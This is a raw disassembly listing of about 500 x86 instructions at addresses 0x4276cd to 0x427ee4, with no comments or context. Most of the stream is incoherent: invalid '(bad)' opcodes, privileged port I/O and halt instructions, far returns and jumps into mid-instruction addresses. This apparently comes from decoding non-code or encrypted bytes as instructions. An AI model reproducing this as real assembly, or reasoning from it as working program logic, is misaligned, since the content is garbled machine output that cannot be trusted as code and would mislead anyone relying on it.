  4276cd:	cdq    
  4276ce:	add    DWORD PTR [edi+0x16],esi
  4276d1:	or     al,BYTE PTR [esi+0x4d4d8b34]
  4276d7:	xor    BYTE PTR [edi-0x76],0x80
  4276db:	lock mov dl,BYTE PTR [ebx+0x7c]
  4276df:	push   ebx
  4276e0:	adc    DWORD PTR [edx-0x454df37a],esi
  4276e6:	sub    edi,edi
  4276e8:	mov    dl,0xa
  4276ea:	cdq    
  4276eb:	add    DWORD PTR [edi+0x16],esi
  4276ee:	or     al,BYTE PTR [esi+0x4d4d8b4c]
  4276f4:	xor    BYTE PTR [edi-0x7e],0xec
  4276f8:	cld    
  4276f9:	push   eax
  4276fa:	ja     0x427711
  4276fc:	dec    ebp
  4276fd:	xlat   BYTE PTR ds:[ebx]
  4276fe:	ds dec ebp
  427700:	xlat   BYTE PTR ds:[ebx]
  427701:	adc    eax,0xec367780
  427706:	ja     0x4276f7
  427708:	or     al,BYTE PTR [esi+0x4d4d82e5]
  42770e:	xor    BYTE PTR [edi-0x76],0x80
  427712:	lock mov dl,BYTE PTR [ebx+0x7c]
  427716:	push   ebx
  427717:	adc    DWORD PTR [edx-0x794dd646],esi
  42771d:	or     al,0xff
  42771f:	mov    dl,0x80
  427721:	lock and DWORD PTR [ebx-0x4e],0xffffffd5
  427726:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427727:	xor    BYTE PTR [edi-0x75],0x80
  42772b:	lock mov edx,DWORD PTR [ebx+0x7c]
  42772f:	push   ebx
  427730:	adc    DWORD PTR [edx-0x794dd646],esi
  427736:	or     al,0xff
  427738:	mov    dl,0x80
  42773a:	lock and DWORD PTR [ebx-0x4e],0xffffffd5
  42773f:	rol    BYTE PTR [eax-0xf7f7489],0x8b
  427746:	push   ebx
  427747:	jl     0x4276fb
  427749:	xchg   BYTE PTR [ebx+edx*2],cl
  42774c:	adc    DWORD PTR [edx-0x4d00d646],esi
  427752:	or     cl,BYTE PTR [ebp-0x29]
  427755:	xor    BYTE PTR ds:[edi+0x36],0xec
  42775a:	ja     0x42774b
  42775c:	or     al,BYTE PTR [esi+0x4d4d8b1d]
  427762:	xor    BYTE PTR [edi-0x76],0x80
  427766:	lock mov dl,BYTE PTR [ebx+0x7c]
  42776a:	mov    dl,0x86
  42776c:	or     al,0x53
  42776e:	adc    DWORD PTR [edx-0x4d00d646],esi
  427774:	or     cl,BYTE PTR [ebp-0x29]
  427777:	xor    BYTE PTR ds:[edi+0x36],0xec
  42777c:	ja     0x42776d
  42777e:	or     al,BYTE PTR [esi+0x4d4d4b0b]
  427784:	xor    al,0x46
  427787:	xor    BYTE PTR [edi+0x46],0x53
  42778b:	je     0x4277e0
  42778d:	sub    dh,BYTE PTR [edx-0x7b4df342]
  427793:	sub    edi,edi
  427795:	mov    dl,0x80
  427797:	lock cs push ebx
  42779a:	mov    dl,0x40
  42779c:	lea    edi,[edx]
  42779e:	lea    ecx,[ebp-0x72c8ea2b]
  4277a4:	int    0x8d
  4277a6:	lea    ecx,[edx]
  4277a8:	dec    ebp
  4277a9:	xlat   BYTE PTR ds:[ebx]
  4277aa:	ds adc bh,0x36
  4277ae:	in     al,dx
  4277af:	xlat   BYTE PTR ds:[ebx]
  4277b0:	out    dx,eax
  4277b1:	xchg   BYTE PTR [esi-0x7fb2b258],bl
  4277b7:	ja     0x42782a
  4277b9:	xor    al,0x3e
  4277bc:	cmp    ch,bh
  4277be:	xor    BYTE PTR [edi+0x3e],0xec
  4277c2:	ja     0x42774a
  4277c4:	push   eax
  4277c5:	ja     0x42774d
  4277c7:	xor    BYTE PTR [edi-0x75],0x80
  4277cb:	lock mov edx,DWORD PTR [ebx+0x11]
  4277cf:	mov    dl,0xba
  4277d1:	sub    DWORD PTR [ebx+0x7c],edx
  4277d4:	mov    dl,0x86
  4277d6:	or     al,0xff
  4277d8:	mov    dl,0x80
  4277da:	lock xchg BYTE PTR [ecx],cl
  4277dd:	and    dh,BYTE PTR [edx-0x7f750f80]
  4277e3:	xchg   edi,eax
  4277e4:	mov    dl,BYTE PTR [ebx+0x2a]
  4277e7:	push   ebx
  4277e8:	xchg   esp,eax
  4277e9:	mov    dl,0xbe
  4277eb:	or     al,0xb2
  4277ed:	clc    
  4277ee:	sub    edi,edi
  4277f0:	(bad)  
  4277f1:	in     al,dx
  4277f2:	lock mul DWORD PTR [ebx-0x4e]
  4277f6:	or     edx,ebp
  4277f8:	hlt    
  4277f9:	retf   
  4277fa:	dec    ebp
  4277fb:	dec    ebp
  4277fc:	xor    BYTE PTR [edi-0x11],0xab
  427800:	test   eax,0x71fb70a3
  427805:	lea    edx,[edi-0x78127880]
  42780b:	adc    eax,0x539b9993
  427810:	push   0xffffff80
  427812:	ja     0x427849
  427814:	or     ch,0x2e
  427817:	cmp    cl,BYTE PTR [ebp-0x10687f73]
  42781d:	or     BYTE PTR [ebp-0x7fde2880],0xe7
  427824:	out    dx,eax
  427825:	and    BYTE PTR [edi-0x7588afdf],0x60
  42782c:	fistp  DWORD PTR [eax-0x21]
  42782f:	adc    DWORD PTR [ebx-0x4a],edx
  427832:	pop    esi
  427833:	xchg   BYTE PTR [edi+0x32532643],cl
  427839:	or     DWORD PTR [esi-0x3e],eax
  42783c:	or     al,0xb2
  42783e:	mov    esp,0x8d4ba229
  427843:	lea    ecx,[ebp+0xc88b2cd]
  427849:	push   ebx
  42784a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42784b:	dec    DWORD PTR [ebx-0x80]
  42784e:	out    0x1d,eax
  427850:	call   DWORD PTR [ebx+eiz*2+0x6313d79c]
  427857:	(bad)  
  427858:	xlat   BYTE PTR ds:[ebx]
  427859:	or     DWORD PTR [edx-0x54881f31],esp
  42785f:	push   esi
  427860:	sar    ebx,cl
  427862:	adc    al,0x62
  427864:	mov    esi,0x8d8d3a9c
  427869:	adc    BYTE PTR [edi+0x15d78071],0x80
  427870:	xchg   edi,eax
  427871:	out    dx,eax
  427872:	adc    bh,0x21
  427875:	adc    BYTE PTR [edi+0x21d780ef],0x80
  42787c:	out    0xef,eax
  42787e:	and    BYTE PTR [edi+0x53325321],0xb6
  427885:	or     DWORD PTR [esi-0x3e],eax
  427888:	or     al,0xb2
  42788a:	mov    esp,0x8d4ba229
  42788f:	lea    ecx,[ebp-0x5bac33]
  427895:	xchg   esp,eax
  427896:	mov    dl,0x88
  427898:	or     al,0xff
  42789a:	dec    ebx
  42789b:	and    bh,0x71
  42789e:	and    BYTE PTR [edi-0x7f7daceb],0x77
  4278a5:	jno    0x4278fa
  4278a7:	retf   
  4278a8:	xor    al,0x15
  4278ab:	or     DWORD PTR [esi-0x54],eax
  4278ae:	or     al,0xb2
  4278b0:	test   BYTE PTR [ecx],ch
  4278b2:	push   ebx
  4278b3:	jo     0x4278b4
  4278b5:	retf   
  4278b6:	push   edi
  4278b7:	lea    ecx,[ebp-0x3b4d3273]
  4278bd:	or     al,0xff
  4278bf:	add    BYTE PTR [eax-0x63131089],0x13
  4278c6:	mov    BYTE PTR [eax+0x21d78051],0x80
  4278cd:	out    0x71,eax
  4278cf:	and    BYTE PTR [edi-0x757b12eb],0xed
  4278d6:	mov    esp,0x29beb28a
  4278db:	push   ebx
  4278dc:	jb     0x427935
  4278de:	aad    0x58
  4278e0:	fist   WORD PTR [ecx]
  4278e2:	mov    ds:0x438f860b,al
  4278e7:	mov    es:0xdf58d54b,al
  4278ed:	adc    DWORD PTR [edx+0x438f86c6],esp
  4278f3:	es in  al,dx
  4278f5:	jl     0x42790a
  4278f7:	(bad)  
  4278f8:	(bad)  
  4278f9:	std    
  4278fa:	(bad)  
  4278fb:	jle    0x42795b
  4278fd:	xchg   BYTE PTR [edi+0x5a22643],cl
  427903:	fstp   DWORD PTR [eax-0x21]
  427906:	adc    DWORD PTR [ebx-0x9],edx
  427909:	mov    ds:0xdf58e8cb,al
  42790e:	adc    edi,edx
  427910:	adc    esp,DWORD PTR [ebx-0x9]
  427913:	xlat   BYTE PTR ds:[ebx]
  427914:	or     DWORD PTR [edx+0x3ca10d57],esp
  42791a:	(bad)  
  42791c:	loope  0x427932
  42791e:	enter  0x25be,0x3a
  427922:	lea    ecx,[ebp-0x7f106880]
  427928:	xlat   BYTE PTR ds:[ebx]
  427929:	and    DWORD PTR [eax-0x187f1059],eax
  42792f:	and    DWORD PTR [ebx+0x32],edx
  427932:	pusha  
  427933:	fistp  DWORD PTR [eax-0x21]
  427936:	adc    DWORD PTR [ebx-0x4a],edx
  427939:	or     DWORD PTR [esi-0x3e],eax
  42793c:	or     al,0xb2
  42793e:	mov    BYTE PTR [ebx+edx*2],cl
  427941:	dec    ebp
  427942:	mov    dl,0xb4
  427944:	sub    DWORD PTR [eax-0x29],edx
  427947:	enter  0x9cff,0x80
  42794b:	out    0xc8,eax
  42794d:	cli    
  42794e:	lea    ecx,[ebp+0x453cd8d]
  427954:	inc    DWORD PTR [esi]
  427956:	and    BYTE PTR [edi+0x50238025],0xa7
  42795d:	xor    ah,BYTE PTR [ebx+0x3]
  427960:	xlat   BYTE PTR ds:[ebx]
  427961:	outs   dx,DWORD PTR ds:[esi]
  427962:	push   ebx
  427963:	jb     0x4279c8
  427965:	pushf  
  427966:	aad    0xb0
  427968:	dec    ebp
  427969:	xlat   BYTE PTR ds:[ebx]
  42796a:	xor    eax,0x4d25d780
  42796f:	xlat   BYTE PTR ds:[ebx]
  427970:	sub    eax,0x4d8ad74d
  427975:	pop    ecx
  427976:	xchg   BYTE PTR [ebx],dh
  427978:	dec    ebx
  427979:	dec    ebp
  42797a:	dec    ebp
  42797b:	push   eax
  42797c:	outs   dx,DWORD PTR ds:[esi]
  42797d:	mov    esi,0x8d8d8dfa
  427982:	adc    BYTE PTR [edi+0x21e780ef],0x53
  427989:	mov    edx,DWORD PTR [ebx-0x4a]
  42798c:	or     DWORD PTR [esi-0x7b],eax
  42798f:	or     al,0xb2
  427991:	popa   
  427992:	or     al,0x50
  427994:	out    0xc8,eax
  427996:	and    bh,0xef
  427999:	and    BYTE PTR [edi+0x29bcb221],0x53
  4279a0:	or     eax,0x53c8d780
  4279a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4279a6:	dec    DWORD PTR [ebx-0x80]
  4279a9:	out    0x71,eax
  4279ab:	push   ebx
  4279ac:	retf   
  4279ad:	call   DWORD PTR [eax+eax*4-0x7dacea59]
  4279b4:	cmp    BYTE PTR [eax+eax*4-0x19],0x71
  4279b9:	adc    BYTE PTR [ecx],0x80
  4279bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4279bd:	adc    eax,0xcfd4609
  4279c2:	mov    dl,0xbc
  4279c4:	sub    DWORD PTR [ebx-0x5c],edx
  4279c7:	mov    dl,0xbe
  4279c9:	or     al,0xa2
  4279cb:	dec    ebx
  4279cc:	lea    ecx,[ebp+0x74ffcd8d]
  4279d2:	jmp    FWORD PTR [edx]
  4279d4:	arpl   di,si
  4279d6:	xlat   BYTE PTR ds:[ebx]
  4279d7:	sbb    DWORD PTR [ebx+0x5],esp
  4279da:	xlat   BYTE PTR ds:[ebx]
  4279db:	nop
  4279dc:	dec    edx
  4279dd:	push   ebx
  4279de:	test   DWORD PTR [esi],ebx
  4279e0:	jne    0x4279a1
  4279e2:	push   0xffffffc8
  4279e4:	outs   dx,DWORD PTR ds:[esi]
  4279e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4279e6:	jbe    0x427a1c
  4279e8:	push   ebx
  4279e9:	test   DWORD PTR [esi],ebx
  4279eb:	jne    0x4279b1
  4279ed:	stos   BYTE PTR es:[edi],al
  4279ee:	xor    BYTE PTR [edi-0x11],0x80
  4279f2:	lock and DWORD PTR [eax-0x287f1069],eax
  4279f9:	and    DWORD PTR [edx+0x438f8605],esp
  4279ff:	es push edi
  427a01:	fistp  DWORD PTR [eax-0x21]
  427a04:	adc    DWORD PTR [ecx],ecx
  427a06:	inc    esi
  427a07:	std    
  427a08:	or     al,0x80
  427a0a:	ret    0x4d53
  427a0d:	push   ebx
  427a0e:	jb     0x4279c2
  427a10:	add    ch,BYTE PTR [ecx]
  427a12:	push   ebx
  427a13:	test   DWORD PTR [edx+0xba20cbe],esi
  427a19:	lea    ecx,[ebp+0x7cffcd8d]
  427a1f:	call   DWORD PTR [ecx+0x5f]
  427a22:	ja     0x4279ae
  427a24:	xlat   BYTE PTR ds:[ebx]
  427a25:	out    dx,al
  427a26:	arpl   WORD PTR [esi+0x47a221d5],si
  427a2c:	fisubr WORD PTR [eax+0x2d]
  427a2f:	mov    ds:0xe3bb390a,al
  427a34:	les    esp,FWORD PTR [esi-0x5e2bc85e]
  427a3a:	adc    edx,ebp
  427a3c:	pop    esp
  427a3d:	js     0x427a63
  427a3f:	xor    ch,BYTE PTR [ebx-0x48f5c57]
  427a45:	sub    eax,0x8780978d
  427a4a:	in     eax,dx
  427a4b:	xchg   DWORD PTR [ecx],esp
  427a4d:	xor    BYTE PTR [edi-0x11],0x80
  427a51:	lock and DWORD PTR [ecx],ecx
  427a54:	inc    esi
  427a55:	std    
  427a56:	or     al,0xb2
  427a58:	mov    esi,0xeff0800c
  427a5d:	adc    BYTE PTR [edi-0x454d66df],0x29
  427a64:	xor    al,0x1d
  427a67:	cli    
  427a68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427a69:	mov    DWORD PTR [esp+edx*8],0x7253fc53
  427a70:	(bad)  
  427a71:	sti    
  427a72:	push   eax
  427a73:	cmp    al,BYTE PTR [eax-0x327fda89]
  427a79:	cmp    cl,BYTE PTR ss:[ebp-0x7f107f73]
  427a80:	ja     0x427aa7
  427a82:	or     ch,0x36
  427a85:	cmp    cl,BYTE PTR [ebp-0x13727f73]
  427a8b:	xchg   edx,eax
  427a8c:	gs xor al,0x25
  427a90:	adc    BYTE PTR [eax+0x32],0x3a
  427a94:	lea    ecx,[ebp-0x1dea8080]
  427a9a:	out    dx,al
  427a9b:	mov    ebp,0x8d8d818d
  427aa0:	dec    ebp
  427aa1:	push   edx
  427aa2:	or     ch,BYTE PTR [edx-0x73af49b3]
  427aa8:	xor    BYTE PTR [edi-0x11],0x80
  427aac:	lock and DWORD PTR [ecx],ecx
  427aaf:	inc    esi
  427ab0:	std    
  427ab1:	or     al,0xb2
  427ab3:	mov    esi,0xeff0800c
  427ab8:	adc    BYTE PTR [edi+0x25d74d21],0x53
  427abf:	cld    
  427ac0:	push   ebx
  427ac1:	jb     0x427ac2
  427ac3:	sti    
  427ac4:	push   eax
  427ac5:	ja     0x427a51
  427ac7:	add    DWORD PTR [edi-0x76],esi
  427aca:	or     bl,BYTE PTR [ebx-0x4de228b3]
  427ad0:	mov    edx,0x15d74d29
  427ad5:	dec    ebp
  427ad6:	xlat   BYTE PTR ds:[ebx]
  427ad7:	jno    0x427b26
  427ad9:	xlat   BYTE PTR ds:[ebx]
  427ada:	and    DWORD PTR [ebp-0x29],ecx
  427add:	out    dx,eax
  427ade:	xchg   BYTE PTR [ebx],dh
  427ae0:	int3   
  427ae1:	dec    ebp
  427ae2:	dec    ebp
  427ae3:	xor    BYTE PTR [edi-0x11],0x80
  427ae7:	lock and DWORD PTR [ecx],ecx
  427aea:	inc    esi
  427aeb:	std    
  427aec:	or     al,0xb2
  427aee:	mov    esi,0xeff0800c
  427af3:	adc    BYTE PTR [edi+0x53fc5321],0x72
  427afa:	mov    dl,0xba
  427afc:	sub    DWORD PTR [eax+0x63fbff09],eax
  427b02:	std    
  427b03:	aad    0x37
  427b05:	xor    BYTE PTR [edi+0x71],0x80
  427b09:	lock adc eax,0xcfd4609
  427b0f:	mov    dl,0xbe
  427b11:	or     al,0x80
  427b13:	lock jno 0x427a96
  427b16:	xchg   edi,eax
  427b17:	adc    eax,0x7253fc53
  427b1c:	mov    dl,0xba
  427b1e:	sub    DWORD PTR [eax-0x400e210],eax
  427b24:	or     DWORD PTR [edx],esp
  427b26:	ja     0x427ab2
  427b28:	push   eax
  427b29:	cmp    ch,BYTE PTR [ecx-0x72e20490]
  427b2f:	xchg   edi,eax
  427b30:	add    BYTE PTR [edi-0x64666c6a],0x53
  427b37:	push   0xffffff80
  427b39:	xlat   BYTE PTR ds:[ebx]
  427b3a:	cmp    eax,0x80459780
  427b3f:	out    0x25,eax
  427b41:	pop    esi
  427b42:	xchg   BYTE PTR [edi-0x249fd9bd],cl
  427b48:	pop    eax
  427b49:	fist   WORD PTR [ecx]
  427b4b:	arpl   di,si
  427b4d:	or     esi,ecx
  427b4f:	dec    esp
  427b50:	lea    ecx,[ebp-0x3960fe73]
  427b56:	in     al,0xee
  427b58:	arpl   si,ax
  427b5a:	(bad)  
  427b5c:	arpl   si,ax
  427b5e:	xlat   BYTE PTR ds:[ebx]
  427b5f:	out    dx,eax
  427b60:	arpl   di,si
  427b62:	or     DWORD PTR [edi],ecx
  427b64:	pop    ss
  427b65:	or     al,0x8d
  427b67:	lea    esp,[edx-0x20a755f3]
  427b6d:	adc    edi,edx
  427b6f:	out    dx,eax
  427b70:	arpl   di,si
  427b72:	or     DWORD PTR [edi],ecx
  427b74:	das    
  427b75:	or     al,0x8d
  427b77:	lea    esp,[edx-0x20a766f3]
  427b7d:	adc    edi,edx
  427b7f:	out    dx,eax
  427b80:	arpl   di,si
  427b82:	or     DWORD PTR [edi],ecx
  427b84:	dec    ebx
  427b85:	lea    ecx,[ebp-0x56f25d73]
  427b8b:	pop    eax
  427b8c:	fist   WORD PTR [ecx]
  427b8e:	xlat   BYTE PTR ds:[ebx]
  427b8f:	out    dx,al
  427b90:	arpl   di,si
  427b92:	aad    0x3f
  427b94:	mov    ds:0xdf58d00d,al
  427b99:	adc    edi,edx
  427b9b:	out    dx,eax
  427b9c:	arpl   di,si
  427b9e:	or     DWORD PTR [edi],ecx
  427ba0:	mov    al,ds:0xa28d8d3a
  427ba5:	or     eax,0x11df58b9
  427baa:	or     DWORD PTR [edi-0x24],ecx
  427bad:	cmp    cl,BYTE PTR [ebp+0x9f7638d]
  427bb3:	(bad)  
  427bb5:	lea    ecx,[ebp+0x3aa2be8d]
  427bbb:	lea    ecx,[ebp+0x4d1dd74d]
  427bc1:	xlat   BYTE PTR ds:[ebx]
  427bc2:	sub    eax,0x4d15d74d
  427bc7:	xlat   BYTE PTR ds:[ebx]
  427bc8:	jno    0x427c17
  427bca:	xlat   BYTE PTR ds:[ebx]
  427bcb:	and    DWORD PTR [ebp-0x29],ecx
  427bce:	out    dx,eax
  427bcf:	xchg   bl,dl
  427bd1:	or     eax,0xb7be4d4d
  427bd6:	cmp    cl,BYTE PTR [ebp-0x3ef25d73]
  427bdc:	pop    eax
  427bdd:	fist   WORD PTR [ecx]
  427bdf:	xlat   BYTE PTR ds:[ebx]
  427be0:	out    dx,eax
  427be1:	arpl   di,si
  427be3:	or     DWORD PTR [edi],ecx
  427be5:	loope  0x427b74
  427be7:	lea    ecx,[ebp+0x58e40da2]
  427bed:	fist   WORD PTR [ecx]
  427bef:	xlat   BYTE PTR ds:[ebx]
  427bf0:	out    dx,eax
  427bf1:	arpl   di,si
  427bf3:	or     DWORD PTR [edi],ecx
  427bf5:	mov    cl,0x3a
  427bf7:	lea    ecx,[ebp+0x58d90da2]
  427bfd:	fist   WORD PTR [ecx]
  427bff:	xlat   BYTE PTR ds:[ebx]
  427c00:	out    dx,al
  427c01:	arpl   di,si
  427c03:	aad    0x1d
  427c05:	mov    ds:0xdf58e60d,al
  427c0a:	adc    edi,edx
  427c0c:	out    dx,eax
  427c0d:	arpl   di,si
  427c0f:	or     DWORD PTR [edi],ecx
  427c11:	aam    0x3a
  427c13:	lea    ecx,[ebp+0x58e80da2]
  427c19:	fist   WORD PTR [ecx]
  427c1b:	les    eax,FWORD PTR [ecx]
  427c1d:	adc    BYTE PTR [edi+0x21d780ef],0x80
  427c24:	out    0xef,eax
  427c26:	and    BYTE PTR [edi+0x53325321],0xb6
  427c2d:	or     DWORD PTR [esi-0x3e],eax
  427c30:	or     al,0xb2
  427c32:	mov    esp,0x8d4ba229
  427c37:	lea    ecx,[ebp+0xc88b2cd]
  427c3d:	push   ebx
  427c3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427c3f:	dec    DWORD PTR [ebx-0x80]
  427c42:	out    0xef,eax
  427c44:	call   DWORD PTR [eax+eax*4-0x6313de59]
  427c4b:	adc    eax,esi
  427c4d:	push   eax
  427c4e:	xchg   edi,eax
  427c4f:	out    dx,eax
  427c50:	push   eax
  427c51:	xlat   BYTE PTR ds:[ebx]
  427c52:	and    DWORD PTR [eax-0x287f1069],eax
  427c58:	and    DWORD PTR [eax-0x587f1019],eax
  427c5e:	and    DWORD PTR [ebx+0x32],edx
  427c61:	push   ebx
  427c62:	mov    dh,0x9
  427c64:	inc    esi
  427c65:	ret    0xb20c
  427c68:	mov    esp,0xb2a45329
  427c6d:	mov    BYTE PTR [edx+eiz*4],cl
  427c70:	dec    ebx
  427c71:	lea    ecx,[ebp-0x6b003273]
  427c77:	dec    DWORD PTR [ebx+0x3f]
  427c7a:	xchg   edi,eax
  427c7b:	jno    0x427c9c
  427c7d:	xlat   BYTE PTR ds:[ebx]
  427c7e:	adc    eax,0x803d9780
  427c83:	xlat   BYTE PTR ds:[ebx]
  427c84:	inc    ebp
  427c85:	adc    BYTE PTR [edi+0x15d78071],0x80
  427c8c:	xchg   edi,eax
  427c8d:	jno    0x427c0f
  427c8f:	xlat   BYTE PTR ds:[ebx]
  427c90:	adc    eax,0x8071e780
  427c95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427c96:	adc    eax,0xb6533253
  427c9b:	or     DWORD PTR [esi-0x3e],eax
  427c9e:	or     al,0xb2
  427ca0:	mov    esp,0xa2a45329
  427ca5:	dec    ebx
  427ca6:	lea    ecx,[ebp-0x774d3273]
  427cac:	or     al,0xff
  427cae:	dec    ebx
  427caf:	and    bh,0x3d
  427cb2:	call   DWORD PTR [eax+eax*4-0x34acba59]
  427cb9:	push   ebx
  427cba:	add    BYTE PTR [eax-0xf7fc289],0x45
  427cc1:	or     DWORD PTR [esi-0x54],eax
  427cc4:	or     al,0x53
  427cc6:	jo     0x427c7a
  427cc8:	test   BYTE PTR [ecx],ch
  427cca:	push   edi
  427ccb:	lea    ecx,[ebp-0x34003273]
  427cd1:	xor    al,0x71
  427cd4:	mov    dl,0xc4
  427cd6:	or     al,0xff
  427cd8:	sub    ah,0x9c
  427cdb:	adc    BYTE PTR [edi-0x1239eceb],0xba
  427ce2:	mov    dh,BYTE PTR [edx+0x6a532988]
  427ce8:	mov    ds:0xdf58d505,al
  427ced:	adc    DWORD PTR [edx+0x438f86c2],esp
  427cf3:	es and bh,0x3d
  427cf7:	and    BYTE PTR [edi-0x754312bb],0xa2
  427cfe:	dec    ebx
  427cff:	aad    0x58
  427d01:	fist   WORD PTR [ecx]
  427d03:	mov    ds:0x438f86c6,al
  427d08:	es in  al,dx
  427d0a:	sub    al,BYTE PTR [eax-0x6becda19]
  427d10:	(bad)  
  427d11:	sti    
  427d12:	push   edi
  427d13:	xchg   BYTE PTR [edi-0xf5d9bd],cl
  427d19:	add    eax,0x58d90ba2
  427d1e:	fist   WORD PTR [ecx]
  427d20:	cdq    
  427d21:	dec    ebp
  427d22:	xlat   BYTE PTR ds:[ebx]
  427d23:	xor    eax,0x9b2dd74d
  427d28:	dec    ebp
  427d29:	xlat   BYTE PTR ds:[ebx]
  427d2a:	sbb    eax,0x4d15d74d
  427d2f:	xlat   BYTE PTR ds:[ebx]
  427d30:	jno    0x427d7f
  427d32:	xlat   BYTE PTR ds:[ebx]
  427d33:	and    DWORD PTR [ebp-0x29],ecx
  427d36:	out    dx,eax
  427d37:	xchg   dh,al
  427d39:	int3   
  427d3a:	dec    ebp
  427d3b:	dec    ebp
  427d3c:	push   eax
  427d3d:	mov    WORD PTR [eax-0x5c565474],es
  427d43:	jo     0x427d40
  427d45:	cmp    eax,0xef97808d
  427d4a:	adc    bh,0x21
  427d4d:	and    bh,0xef
  427d50:	and    BYTE PTR [edi+0x53b65321],0x32
  427d57:	or     DWORD PTR [esi-0x3e],eax
  427d5a:	or     al,0xb2
  427d5c:	mov    esp,0x8d4ba229
  427d61:	lea    ecx,[ebp+0xc88b2cd]
  427d67:	push   ebx
  427d68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427d69:	call   DWORD PTR [edi+edi*8+0x71e7804b]
  427d70:	and    BYTE PTR [edi-0x6300eb],0xc6
  427d77:	push   eax
  427d78:	xchg   edi,eax
  427d79:	jno    0x427dcb
  427d7b:	xlat   BYTE PTR ds:[ebx]
  427d7c:	adc    eax,0x803d9780
  427d81:	xlat   BYTE PTR ds:[ebx]
  427d82:	inc    ebp
  427d83:	adc    BYTE PTR [edi+0x15d78071],0x80
  427d8a:	xchg   edi,eax
  427d8b:	out    dx,eax
  427d8c:	adc    bh,0x21
  427d8f:	adc    BYTE PTR [edi+0x21d780ef],0x80
  427d96:	out    0xef,eax
  427d98:	and    BYTE PTR [edi+0x53b65321],0x32
  427d9f:	or     DWORD PTR [esi-0x3e],eax
  427da2:	or     al,0xb2
  427da4:	mov    esp,0x8d4ba229
  427da9:	lea    ecx,[ebp-0x5bac33]
  427daf:	xchg   esp,eax
  427db0:	mov    dl,0x88
  427db2:	or     al,0xff
  427db4:	dec    ebx
  427db5:	and    bh,0x71
  427db8:	and    BYTE PTR [edi+0x53cb5315],0x82
  427dbf:	xor    BYTE PTR [edi+0x71],0x80
  427dc3:	lock adc eax,0xcac4609
  427dc9:	push   ebx
  427dca:	jo     0x427dcb
  427dcc:	retf   
  427dcd:	mov    dl,0x84
  427dcf:	sub    DWORD PTR [edi-0x73],edx
  427dd2:	lea    ecx,[ebp+0xcc4b2cd]
  427dd8:	inc    DWORD PTR [edx-0x7fc28880]
  427dde:	lock inc ebp
  427de0:	in     al,dx
  427de1:	pushf  
  427de2:	and    bh,0x3d
  427de5:	adc    eax,esi
  427de7:	and    BYTE PTR [edi-0x79fa5dbb],0x8f
  427dee:	inc    ebx
  427def:	es push edi
  427df1:	fistp  DWORD PTR [eax-0x21]
  427df4:	adc    DWORD PTR [ecx],ecx
  427df6:	inc    esi
  427df7:	std    
  427df8:	or     al,0xb2
  427dfa:	mov    esp,0xcbeb229
  427dff:	push   ebx
  427e00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427e01:	mov    ds:0x8d8d8d4b,al
  427e06:	int    0xff
  427e08:	sub    bh,bh
  427e0a:	je     0x427df8
  427e0c:	not    DWORD PTR [ebx]
  427e0e:	add    eax,0x80eff080
  427e13:	xchg   edi,eax
  427e14:	and    DWORD PTR [eax-0x587f8e19],eax
  427e1a:	adc    eax,0xed8abaed
  427e1f:	mov    esp,0xd505a28a
  427e24:	pop    eax
  427e25:	fist   WORD PTR [ecx]
  427e27:	mov    ds:0xdf58d54b,al
  427e2c:	adc    DWORD PTR [edx+0x6a532988],esi
  427e32:	mov    ds:0x438f86c2,al
  427e37:	mov    es:0x438f86c6,al
  427e3d:	es in  al,dx
  427e3f:	sub    dl,BYTE PTR [ebx]
  427e41:	xchg   esp,eax
  427e42:	mov    esi,0x4d4d0d48
  427e47:	xchg   edi,eax
  427e48:	add    BYTE PTR [edi-0x66e27813],0x60
  427e4f:	fstp   DWORD PTR [eax-0x21]
  427e52:	adc    DWORD PTR [eax-0x10],edx
  427e55:	xor    bl,BYTE PTR [esi-0x7a]
  427e58:	pop    DWORD PTR [ebx+0x26]
  427e5b:	push   eax
  427e5c:	ja     0x427e26
  427e5e:	jl     0x427ed7
  427e60:	xchg   ah,ah
  427e62:	pop    eax
  427e63:	fist   WORD PTR [ecx]
  427e65:	push   eax
  427e66:	ja     0x427def
  427e68:	adc    BYTE PTR [edi-0x37287fce],0x9b
  427e6f:	or     DWORD PTR [esi-0x3e],eax
  427e72:	or     al,0xb2
  427e74:	mov    BYTE PTR [eax+eax*4],cl
  427e77:	xlat   BYTE PTR ds:[ebx]
  427e78:	xor    al,BYTE PTR [eax-0x5df53719]
  427e7e:	ret    0xc7a7
  427e81:	add    al,0xd4
  427e83:	push   ebx
  427e84:	dec    ebp
  427e85:	xchg   esi,eax
  427e86:	call   FWORD PTR [eax+edx*2-0x687f7569]
  427e8d:	and    DWORD PTR [eax-0x69],edx
  427e90:	and    DWORD PTR [ebp-0x29],ecx
  427e93:	and    DWORD PTR [ecx],eax
  427e95:	ja     0x427e21
  427e97:	dec    ebp
  427e98:	xlat   BYTE PTR ds:[ebx]
  427e99:	out    dx,eax
  427e9a:	mov    dl,0x2
  427e9c:	sub    DWORD PTR [edx],ecx
  427e9e:	dec    ebp
  427e9f:	xlat   BYTE PTR ds:[ebx]
  427ea0:	and    DWORD PTR [ebp-0x29],ecx
  427ea3:	xchg   DWORD PTR [ebp-0x29],ecx
  427ea6:	xchg   BYTE PTR [ebp-0x29],cl
  427ea9:	enter  0xd74d,0x32
  427ead:	xchg   bh,ah
  427eaf:	mov    cl,BYTE PTR [ebp+0x4d]
  427eb2:	stos   DWORD PTR es:[edi],eax
  427eb3:	push   eax
  427eb4:	ja     0x427e40
  427eb6:	xor    BYTE PTR [edi-0x76],0xa9
  427eba:	jo     0x427eb7
  427ebc:	out    dx,eax
  427ebd:	lea    edx,[edi-0x6127880]
  427ec3:	mov    ebp,ebp
  427ec5:	xchg   DWORD PTR [ebp-0x67],eax
  427ec8:	jl     0x427f3f
  427eca:	xor    eax,0x8d8d8d35
  427ecf:	lea    edi,[ebp+esi*2+0x35]
  427ed3:	inc    ebp
  427ed4:	lea    ecx,[ebp+0x75018d8d]
  427eda:	xor    eax,0xd74d0a71
  427edf:	xor    eax,0x4d2dd74d
  427ee4:	xlat   BYTE PTR ds:[ebx]
